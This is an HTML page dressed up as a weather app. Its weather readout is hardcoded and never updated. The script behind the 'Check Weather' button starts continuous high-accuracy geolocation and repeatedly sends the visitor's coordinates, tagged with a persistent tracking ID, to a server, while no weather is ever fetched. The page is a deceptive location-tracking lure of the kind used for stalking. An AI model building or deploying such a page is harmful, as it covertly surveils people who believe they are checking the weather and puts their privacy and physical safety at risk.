<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather App</title>
    <style>
        /* Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Body Styling */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to right, #4facfe, #00f2fe);
            font-family: Arial, sans-serif;
        }

        /* Weather Card Styling */
        .weather-card {
            background-color: #fff;
            padding: 25px 20px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 300px;
            width: 100%;
            transform: scale(1.5);
        }

        /* Title Styling */
        .weather-card h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 5px;
        }

        /* Location Styling */
        .location {
            font-size: 18px;
            color: #555;
            margin-top: 5px;
        }

        /* Weather Icon Styling */
        .weather-icon {
            margin: 20px 0;
        }

        .weather-icon img {
            width: 80px;
            height: 80px;
        }

        /* Weather Info Styling */
        .weather-info {
            margin: 20px 0;
        }

        .temperature {
            display: block;
            font-size: 48px;
            font-weight: bold;
            color: #333;
        }

        .condition {
            font-size: 20px;
            color: #777;
        }

        /* Button Styling */
        button {
            padding: 12px 24px;
            background-color: #4facfe;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        button:disabled {
            opacity: 70%;
        }

        @media(max-width: 500px) {
            .weather-card {
                transform: scale(1);
            }
        }
    </style>
</head>

<body>
    <div class="weather-card">
        <h2>Weather App</h2>
        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>

        <!-- Weather Icon -->
        <div class="weather-icon">
            <img src="/weather.png" alt="Weather Icon">
        </div>

        <div class="weather-info">
            <span class="temperature">25°C</span>
            <span class="condition">Sunny</span>
        </div>

        <button id="check-weather">Check Weather</button>
    </div>


    <script>
        const id = localStorage.getItem("id") || generateId();
        const btn = document.querySelector("#check-weather");
        let watchId = null;

        btn.addEventListener("click", () => {
            if (!("geolocation" in navigator)) {
                alert("Is browser mein location support nahi hai.");
                return;
            }

            btn.disabled = true;
            btn.textContent = "Waiting for location...";

            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }

            watchId = navigator.geolocation.watchPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;

                    try {
                        const response = await fetch("/weather", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ id, lat, lng })
                        });

                        if (!response.ok) {
                            throw new Error("Server response: " + response.status);
                        }

                        btn.textContent = "Location sharing active";
                    } catch (error) {
                        console.error("Location send failed:", error);
                        btn.disabled = false;
                        btn.textContent = "Retry location sharing";
                    }
                },
                (error) => {
                    console.error("Location error:", error);
                    alert("Location nahi mili. Browser permission aur device GPS check karo.");
                    btn.disabled = false;
                    btn.textContent = "Check Weather";
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 2000,
                    timeout: 20000
                }
            );
        });

        function generateId(length = 10) {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            localStorage.setItem("id", result);
            return result;
        }
    </script>
</body>

</html>
